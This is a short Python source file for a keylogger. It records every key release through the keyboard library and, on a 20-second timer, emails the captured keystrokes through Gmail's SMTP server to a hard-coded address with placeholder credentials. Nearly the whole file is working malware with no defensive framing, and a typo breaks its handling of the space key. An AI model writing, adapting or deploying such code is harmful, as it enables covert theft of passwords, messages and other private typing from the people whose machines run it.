
import keyboard
import smtplib
from threading import Semaphore,Timer

report_timing=20
email_addr="dummmy@gmail.com"
email_password='dummypass'

class Keylogger:
    def __init__(self,interval):
        self.interval=interval
        self.log=""
        #for blocking after setting the on release listner
        self.semaphore=Semaphore(0)
        
    def callback(self,event):
        """
        this call back funciton is called whenever a keyboard event is occured 
        (i.e, when a key is relesed this program)
        """
        name = event.name
        if len(name) > 1:
            #not a char with special key (eg. ctrl ,alt etc..)
            #the upper cases with [ ]
            if name=="sapce":
                name= " "
            elif name == "enter":
                name="[ENTER]"
            elif name =="decimal":
                name="."
            else:
                name=name.replace(" ","_")
                name= f"[{name.upper()}]"
        self.log +=name
    def sendmail(self,email,password,message):
        server=smtplib.SMTP(host="smtp.gmail.com",port=587)
        server.starttls()
        server.login(email,password)
        server.sendmail(email,email,message)
        server.quit()
    def report(self):
        """
        this function gonnna called every self,interval gap 
        it is basically sends keylogs and resets 'self.log'
        variable
        """
        if self.log:
            self.sendmail(email_addr,email_password,self.log)
        self.log=""
        Timer(interval=self.interval,function=self.report).start()
    def start(self):
        keyboard.on_release(callback=self.callback)
        self.report()
        self.semaphore.acquire()
if __name__ == "__main__":
    Keylogger=Keylogger(interval=report_timing)
    Keylogger.start()
